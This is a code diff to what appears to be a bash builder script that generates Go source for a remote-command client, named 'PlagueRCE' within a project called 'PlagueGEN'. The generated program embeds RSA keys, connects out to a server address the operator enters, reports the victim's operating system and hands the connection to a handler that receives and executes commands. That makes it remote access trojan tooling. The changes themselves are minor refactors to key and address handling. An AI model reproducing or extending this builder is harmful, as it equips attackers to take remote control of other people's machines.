@@ -2,7 +2,6 @@
 
 # Prompt user for server IP address
 read -p "Enter the server IP address and port (IP:port): " server_ip
-echo "server_ip: $server_ip"
 
 # Prompt user for encryption mode
 read -p "Do you want to use encryption mode? [y]: " use_encryption
@@ -41,17 +40,13 @@ import (
 )
 
 func main() {
-	// Hardcoded RSA public key
-	const public_key string = "$public_key"
-	// Hardcoded RSA private key
-	const private_key string = "$private_key"
 
 	// Format RSA keys properly
 	// Remove leading and trailing whitespaces from RSA keys
-	var formatted_public_key string = strings.TrimSpace(public_key)
-	var formatted_private_key string = strings.TrimSpace(private_key)
+	var formatted_public_key string = strings.TrimSpace("$public_key")
+	var formatted_private_key string = strings.TrimSpace("$private_key")
 	
-	const server_address string = "$server_ip" // Server TCP/IP address
+	var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
 	const OSinfo string = runtime.GOOS                  // Get operating system information
 
 	// Connect to PlagueRCE server
@@ -83,10 +78,12 @@ import (
     "net"
     "packages/PlagueGEN/Code/packages" // Import my local packages
     "runtime"
+    "strings"
 )
 
 func main() {
-    const server_address string = "$server_ip" // Server TCP/IP address
+
+    var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
     const OSinfo string = runtime.GOOS        // Get operating system information
 
     // Connect to PlagueRCE server
@@ -104,7 +101,9 @@ func main() {
 
     // Start the handler to receive and execute commands
     packages.Handler(&conn, OSinfo, conn_update)
+
 }
+
 EOF
 fi
 
